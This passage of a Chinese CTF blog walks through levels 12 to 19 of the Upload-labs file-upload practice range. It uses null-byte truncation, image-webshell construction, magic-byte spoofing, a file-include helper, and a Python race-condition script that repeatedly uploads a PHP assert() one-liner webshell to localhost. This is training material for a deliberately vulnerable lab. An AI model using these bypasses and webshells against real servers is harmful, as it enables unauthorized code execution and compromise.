+<h3 id="Pass-12-00截断-POST"><a href="#Pass-12-00截断-POST" class="headerlink" title="Pass-12(00截断$_POST)"></a>Pass-12(00截断$_POST)</h3><p>查看源码，$_POST传参save_path<br><img src="https://s2.ax1x.com/2019/01/25/km5OQe.png" alt="km5OQe.png"></p>
+<p>还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 </p>
+<p><img src="https://s2.ax1x.com/2019/01/25/knpklj.png" alt="knpklj.png"><br>添加一个1.php+(任意名称)</p>
+<p><img src="https://s2.ax1x.com/2019/01/25/knpukT.png" alt="knpukT.png"><br>这里的2b对应的就是**+**号，将2b改成00，即可成功截断，1.php也可成功上传利用<br><img src="https://s2.ax1x.com/2019/01/25/knp43Q.png" alt="knp43Q.png"></p>
+<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>查看源码，<br><img src="https://s2.ax1x.com/2019/01/26/kn3mtS.png" alt="kn3mtS.png"></p>
+<p>可以看出，验证上传文件类型的方法是：通过判断上传文件的前两个字节来判断的，所以直接上传图片马即可绕过.jpg和.png检查，制作方法<br><code>copy 1.jpg /b + info.php /a shell.jpg</code><br>1.jpg是一个图片，info.php写入一句话木马的文件，shell.jpg复制后的文件<br><img src="https://s2.ax1x.com/2019/01/26/kn3Mlj.png" alt="kn3Mlj.png"></p>
+<p>添加GIF图片的文件头GIF89a，绕过GIF图片检查。</p>
+<p>一句话木马也可以上传成功<br><img src="https://s2.ax1x.com/2019/01/26/knGCqI.png" alt="knGCqI.png"><br>文件路径也会显示，然后就可以利用文件包含漏洞。<br><img src="https://s2.ax1x.com/2019/01/26/knGaLR.png" alt="knGaLR.png"></p>
+<p>可以写一个include.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;page&#x27;];</span><br><span class="line">include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后放在upload中，在你上传成功图片马之后，你可以访问，执行phpinfo().<br><code>http://127.0.0.1/uploadlab/upload/include.php?page=upload/5020190128200535.jpg</code></p>
+<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>查看源码，<br><img src="https://s2.ax1x.com/2019/01/26/knGLOs.png" alt="knGLOs.png"><br>这里使用getimagesize获取文件类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 </span><br></pre></td></tr></table></figure>
+
+<p>利用图片马就可进行绕过，和上一关一样。</p>
+<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>查看源码，<br><img src="https://s2.ax1x.com/2019/01/26/kntVJK.png" alt="kntVJK.png"></p>
+<p>利用exif_imagetype()，判断文件类型，Pass-13的方法即可绕过。</p>
+<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>查看源码</p>
+<p><img src="https://s2.ax1x.com/2019/01/26/knt0wn.png" alt="knt0wn.png"><br>使用imagecreatefromjpeg()来判断文件类别，已可以使用Pass-13的方法。</p>
+<p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
+<h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>查看源码<br><img src="https://s2.ax1x.com/2019/01/28/kMawUH.png" alt="kMawUH.png"></p>
+<p>利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"># Build By LandGrey</span><br><span class="line"> </span><br><span class="line">import hackhttp</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def upload(lists):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/upload-labs/Pass-17/index.php</span><br><span class="line">Cookie: pass=17</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span><br><span class="line">Content-Length: 341</span><br><span class="line"> </span><br><span class="line">-----------------------------6696274297634</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">&lt;?php assert($_POST[&quot;LandGrey&quot;])?&gt;</span><br><span class="line">-----------------------------6696274297634</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"> </span><br><span class="line">上传</span><br><span class="line">-----------------------------6696274297634--</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    code, head, html, redirect, log = hh.http(&#x27;http://127.0.0.1/upload-labs/Pass-17/index.php&#x27;, raw=raw)</span><br><span class="line">    print(str(code) + &quot;\r&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pool = ThreadPool(10)</span><br><span class="line">pool.map(upload, range(10000))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
+<p>在脚本运行的时候，访问Webshell，我一直没成功，不知道为什么<br>原文链接：<a target="_blank" rel="noopener" href="https://www.chabug.org/web/470.html">https://www.chabug.org/web/470.html</a></p>
+<h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>查看源码<br><img src="https://s2.ax1x.com/2019/01/28/kMd1eS.png" alt="kMd1eS.png"><br>像Pass-13一样可以上传图片马</p>
+<h3 id="Pass-19-CVE-2015-2348-move-uploaded-file-00截断"><a href="#Pass-19-CVE-2015-2348-move-uploaded-file-00截断" class="headerlink" title="Pass-19(CVE-2015-2348 move_uploaded_file() 00截断)"></a>Pass-19(CVE-2015-2348 move_uploaded_file() 00截断)</h3><p>查看源码<br><img src="https://s2.ax1x.com/2019/01/28/kMdaQ0.png" alt="kMdaQ0.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传失败！&#x27;;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的<br>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过：<br>利用方式：<br>上传的文件名用0x00绕过,改成19.php【二进制00】.1.jpg<br><img src="https://s2.ax1x.com/2019/01/28/kMwj3R.png" alt="kMwj3R.png"></p>
+<p>参考两个大佬的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_29647709/article/details/81264120</span><br><span class="line">https://www.chabug.org/web/470.html</span><br></pre></td></tr></table></figure>
+
+
+
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/upload-labs/">upload_labs</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2018/12/20/%E9%9D%B6%E5%9C%BA/Upload-labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-title="Upload_labs文件上传靶场通关 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/01/24/大学CTF/CUMT双月赛二/" title="CUMMT双月赛二">
+  <strong>上一篇：</strong><br/>
+  <span>
+  CUMMT双月赛二</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/12/16/大学CTF/Bugku-Web-WriteUp/"  title="Bugku_Web_WriteUp">
+ <strong>下一篇：</strong><br/> 
+ <span>Bugku_Web_WriteUp
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-number">2.</span> <span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-number">3.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-number">4.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-04"><span class="toc-number">5.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-05"><span class="toc-number">6.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-06"><span class="toc-number">7.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-07"><span class="toc-number">8.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-08"><span class="toc-number">9.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-09"><span class="toc-number">10.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-10"><span class="toc-number">11.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-11-00%E6%88%AA%E6%96%AD-GET"><span class="toc-number">12.</span> <span class="toc-text">Pass-11(00截断$_GET)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-12-00%E6%88%AA%E6%96%AD-POST"><span class="toc-number">13.</span> <span class="toc-text">Pass-12(00截断$_POST)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-13"><span class="toc-number">14.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-14"><span class="toc-number">15.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-15"><span class="toc-number">16.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-16"><span class="toc-number">17.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-17"><span class="toc-number">18.</span> <span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-18"><span class="toc-number">19.</span> <span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-19-CVE-2015-2348-move-uploaded-file-00%E6%88%AA%E6%96%AD"><span class="toc-number">20.</span> <span class="toc-text">Pass-19(CVE-2015-2348 move_uploaded_file() 00截断)</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
